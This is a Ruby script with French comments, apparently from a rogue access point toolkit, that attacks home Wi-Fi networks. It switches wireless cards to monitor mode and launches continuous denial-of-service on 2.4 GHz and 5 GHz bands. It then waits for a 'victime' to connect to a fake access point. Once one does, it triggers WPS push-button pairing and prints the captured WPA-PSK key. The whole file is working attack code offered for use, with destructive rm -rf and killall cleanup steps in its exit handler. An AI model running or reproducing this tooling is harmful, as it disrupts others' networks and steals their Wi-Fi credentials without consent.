#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exiting and cleaning your files....\e[0m"
sleep 3
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1
if File.exist?("cartef.txt")
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
File.open("cartebis.txt").readlines.each do |cartebis|
   puts cartebis
$cartebis = cartebis.chomp
puts "Redémarrage des interfaces wifi..."
`ifconfig #{$cartef} down`
`iw dev #{$cartef} set type managed`
sleep 2
`ip link set #{$cartef} up`
         sleep 2
`ifconfig #{$cartebis} down`
`iw dev #{$cartebis} set type managed`
sleep 2
`ip link set #{$cartebis} up`
         sleep 2         
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
`rm -rf *.txt`
puts "Bye..."
exit
end
end
else
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1
`rm -rf *.txt`
sleep 2
puts "Redémarrage de l'interface wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
`iw dev wlan1 set type managed`
sleep 2
`ip link set wlan1 up`
         sleep 3
`systemctl enable NetworkManager.service`
sleep 3
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
puts "Bye..."
exit
end
end

class Start
def self.interface
puts "Lancement des cartes wifi..."
load 'accessdosbis.rb'
sleep 1
`ip link set #{$cartef} down`
`iw dev #{$cartef} set type monitor`
sleep 2
`ip link set #{$cartef} up`
sleep 2
`ip link set #{$cartebis} down`
`iw dev #{$cartebis} set type monitor`
sleep 2
`ip link set #{$cartebis} up`
sleep 2
Start.activeDos
end

def self.activeDos
puts "La DoS en 2.4GHz va commencer maintenant..."
dos = Thread.new { `bash rundosdev.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Start.dosBis
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.dosBis
puts "La DoS en 5GHz va commencer maintenant..."
dosbis = Thread.new { `bash rundos5ghz.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve)
Start.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente     
`truncate -s 0 /tmp/hostapd.psk`
sleep 1 
puts "En attente de la victime... appuyez sur CTRL+C pour quitter..."
loop do
sleep 1
if File.zero?("/tmp/hostapd.psk")
else
puts "\e[1;32m[*] Victime connectée.\e[0m"
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1
puts "\e[1;32m[*] Stoping DoS attack...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
Process.kill 15, File.read('/tmp/terminalfrequence.pid').to_i
`killall xterm`
`killall sleep`
sleep 1
puts "Redemérrage de l'interface wifi et lancement de wpa_cli..."
load 'historiquebis.rb'
`ip link set #{$cartebis} down`
`iw dev #{$cartebis} set type managed`
sleep 4
`rfkill unblock all`
`ip link set #{$cartebis} up`
       puts "En attente de l'appui du bouton WPS... CTRL+C pour sortir."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.3FR/wpa_supplicant.conf /etc/`
sleep 1;
puts $apmac
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartebis} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Start.wpsgrab 
sleep(5000000)
end

def self.wpsgrab
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1
load 'lastattack.rb'
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] Le bouton WPS a été appuyé, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
end
end
end
end
end
